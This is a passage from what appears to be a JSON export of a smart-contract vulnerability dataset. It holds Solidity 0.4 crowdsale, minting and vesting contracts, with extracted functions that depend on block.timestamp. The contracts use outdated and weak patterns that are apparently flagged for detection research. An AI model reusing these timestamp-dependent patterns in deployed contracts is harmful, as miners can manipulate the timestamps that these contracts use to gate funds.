address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f3c"
  },
  "filename": "7515.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f3d"
  },
  "filename": "7519.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract BSPMintable is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Mint(uint256 amount);\n event DistributorChanged(address indexed previousDistributor, address indexed newDistributor);\n address public distributor = 0x4F91C1f068E0dED2B7fF823289Add800E1c26Fc3;\n ERC20Basic public BSPToken = ERC20Basic(0x5d551fA77ec2C7dd1387B626c4f33235c3885199);\n uint256 constant public rewardAmount = 630000000 * (10 ** 18);\n uint256 constant public duration = 4 years;\n uint256[4] public miningRate = [40,20,20,20];\n bool public started = false;\n uint256 public startTime;\n uint256 public minted;\n modifier whenStarted() {\n require(started == true && startTime <= block.timestamp);\n _;\n }\n function startMining(uint256 _startTime) public onlyOwner {\n require(started == false && BSPToken.balanceOf(this) >= rewardAmount);\n require(_startTime >= block.timestamp);\n require(_startTime <= block.timestamp + 60 days);\n startTime = _startTime;\n started = true;\n }\n function changeDistributor(address _newDistributor) public onlyOwner {\n emit DistributorChanged(distributor, _newDistributor);\n distributor = _newDistributor;\n }\n function mint() public whenStarted {\n uint256 unminted = mintableAmount();\n require(unminted > 0);\n minted = minted.add(unminted);\n BSPToken.safeTransfer(distributor, unminted);\n emit Mint(unminted);\n }\n function mintableAmount() public view returns (uint256) {\n if(started == false || startTime >= block.timestamp){\n return 0;\n }\n if (block.timestamp >= startTime.add(duration)){\n return BSPToken.balanceOf(this);\n }\n uint currentYear = block.timestamp.sub(startTime).div(1 years);\n uint currentDay = (block.timestamp.sub(startTime) % (1 years)).div(1 days);\n uint currentMintable = 0;\n for (uint i = 0; i < currentYear; i++){\n currentMintable = currentMintable.add(rewardAmount.mul(miningRate[i]).div(100));\n }\n currentMintable = currentMintable.add(rewardAmount.mul(miningRate[currentYear]).div(36500).mul(currentDay));\n return currentMintable.sub(minted);\n }\n function totalBspAmount() public view returns (uint256) {\n return BSPToken.balanceOf(this).add(minted);\n }\n function () public payable {\n revert ();\n }\n}",
  "extract_feature": [
    "function startMining(uint256 _startTime) public onlyOwner {\nrequire(started == false && BSPToken.balanceOf(this) >= rewardAmount);\nrequire(_startTime >= block.timestamp);\nrequire(_startTime <= block.timestamp + 60 days);\nstartTime = _startTime;\nstarted = true;\n}",
    "function mintableAmount() public view returns (uint256) {\nif(started == false || startTime >= block.timestamp){\nreturn 0;\n}\nif (block.timestamp >= startTime.add(duration)){\nreturn BSPToken.balanceOf(this);\n}\nuint currentYear = block.timestamp.sub(startTime).div(1 years);\nuint currentDay = (block.timestamp.sub(startTime) % (1 years)).div(1 days);\nuint currentMintable = 0;\nfor (uint i = 0; i < currentYear; i++){\ncurrentMintable = currentMintable.add(rewardAmount.mul(miningRate[i]).div(100));\n}\ncurrentMintable = currentMintable.add(rewardAmount.mul(miningRate[currentYear]).div(36500).mul(currentDay));\nreturn currentMintable.sub(minted);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f3e"
  },
  "filename": "7521.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n}\ncontract BSPVesting {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n address public beneficiary = 0xb790f6DBd477C7125b13a8Bb3a67771027Abd402;\n ERC20Basic public BSPToken = ERC20Basic(0x5d551fA77ec2C7dd1387B626c4f33235c3885199);\n uint256 public start = 1577808000;\n uint256 public duration = 15 * 30 days;\n uint256 public released;\n function release() public {\n uint256 unreleased = releasableAmount();\n require(unreleased > 0);\n released = released.add(unreleased);\n BSPToken.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function releasableAmount() public view returns (uint256) {\n return vestedAmount().sub(released);\n }\n function vestedAmount() public view returns (uint256) {\n uint256 currentBalance = BSPToken.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released);\n if (block.timestamp >= start.add(duration)) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n function () public payable {\n revert ();\n }\n}",
  "extract_feature": [
    "function vestedAmount() public view returns (uint256) {\nuint256 currentBalance = BSPToken.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released);\nif (block.timestamp >= start.add(duration)) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f3f"
  },
  "filename": "7570.sol",
